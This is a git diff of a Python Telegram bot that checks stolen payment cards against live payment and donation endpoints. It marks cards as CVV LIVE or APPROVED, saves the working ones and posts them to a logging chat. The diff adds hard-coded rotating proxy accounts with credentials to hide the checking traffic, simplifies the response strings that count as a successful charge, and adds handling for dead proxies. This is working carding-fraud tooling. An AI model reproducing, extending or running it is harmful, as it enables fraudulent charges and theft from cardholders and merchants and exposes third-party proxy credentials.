@@ -1,6 +1,7 @@
 import time
 from pyrogram import Client
 import requests
+from requests.exceptions import ProxyError
 import re
 from values import *
 from pyrogram import Client, filters
@@ -18,7 +19,10 @@ headers = {
 
 
 
-
+arr = ['http://copunwcs-rotate:zpxyewfj84cp@p.webshare.io:80/',
+    'http://juigtril-rotate:7iwuusjuufgp@p.webshare.io:80/',
+    'http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/',
+    'http://vctalybl-rotate:9bs22acxfssz@p.webshare.io:80/',]
 
 
 
@@ -104,7 +108,10 @@ async def ca(Client, message):
                             else:
                                 bin_data = json.loads(res.text)
                                 vendor = bin_data["data"]["vendor"].lower()
+                                proxy = random.choice(arr)
+                                proxies = { 'http' : proxy, 'https' : proxy}
                                 curl =  requests.Session()
+                                curl.proxies = proxies
                                 res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                 random_data = json.loads(res.text)
                                 # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
@@ -186,7 +193,7 @@ async def ca(Client, message):
                                             response = "CVV LIVE"
                                             r_logo = "✅"
                                             r_text = 'ZIP INCORRECT'
-                                        elif '"cvc_check":"pass"' in res.text or '"cvc_check":"success"' in res.text or "Thank You." in res.text or '"status": "succeeded"' in res.text or "Thank You For Donation." in res.text or "Your payment has already been processed" in res.text or "Success " in res.text or '"type":"one-time"' in res.text or "/donations/thank_you?donation_number=" in res.text or '"status": "complete"' in res.text or '"status": "cahrged"' in res.text or '"status": "suceess"' in res.text or '"status": "thanks"' in res.text or '"status": "successufulty"' in res.text or '"status": "thaks for your donation."' in res.text or '"status": "save"' in res.text or '"status": "pass"' in res.text or '"status": "true"' in res.text or '"status": "valid"' in res.text or '"status": "null"' in res.text or '"status": "complete"' in res.text or '"status": "validated"' in res.text or '"status": "successufll"' in res.text or '"status": "succefulity"' in res.text or "Payment complete" in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "cahrged"' in res.text or '"cvc_check": "suceess"' in res.text or '"cvc_check": "thanks"' in res.text or '"cvc_check": "successufulty"' in res.text or '"cvc_check": "thaks for your donation."' in res.text or '"cvc_check": "save"' in res.text or '"cvc_check": "pass"' in res.text or '"cvc_check": "true"' in res.text or '"cvc_check": "valid"' in res.text or '"cvc_check": "null"' in res.text or '"cvc_check": "complete"' in res.text or '"cvc_check": "validated"' in res.text or '"cvc_check": "successufll"' in res.text or '"cvc_check": "succefulity"' in res.text or "Payment complete" in res.text or "fraudulent, LIVE" in res.text or "cvv_charged" in res.text or "cvv_not_charged" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text : #or 'donation_number=' in res.text
+                                        elif  '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text : #or 'donation_number=' in res.text
                                             save_live(lista)
                                             await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                             response = "APPROVED"
@@ -198,18 +205,6 @@ async def ca(Client, message):
                                             response = "APPROVED"
                                             r_logo = "✅"
                                             r_text = "LOW BALANCE"
-                                        elif "pickup_card" in res.text or 'Pickup Card' in res.text or 'pickup card' in res.text: 
-                                            response = "APPROVED"
-                                            r_logo = "✅"
-                                            r_text = "PICKUP CARD"
-                                        elif "stolen_card" in res.text or 'stolen Card' in res.text or 'stolen card' in res.text: 
-                                            response = "APPROVED"
-                                            r_logo = "✅"
-                                            r_text = "STOLEN CARD"
-                                        elif "lost_card" in res.text or 'Lost Card' in res.text or 'lost card' in res.text: 
-                                            response = "APPROVED"
-                                            r_logo = "✅"
-                                            r_text = "LOST CARD"
                                         elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                             save_ccn(lista)
                                             await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
@@ -261,7 +256,9 @@ async def ca(Client, message):
 <b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                         await msg.edit_text(lasttext)
                                         antidb.set(message.from_user.id, int(time.time()))
-    
+    except ProxyError as e:
+        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
+        await Client.send_message(chat_id=loggp, text=proxy)
     except Exception as e:
         await Client.send_message(chat_id=loggp, text=e)
         print(e)
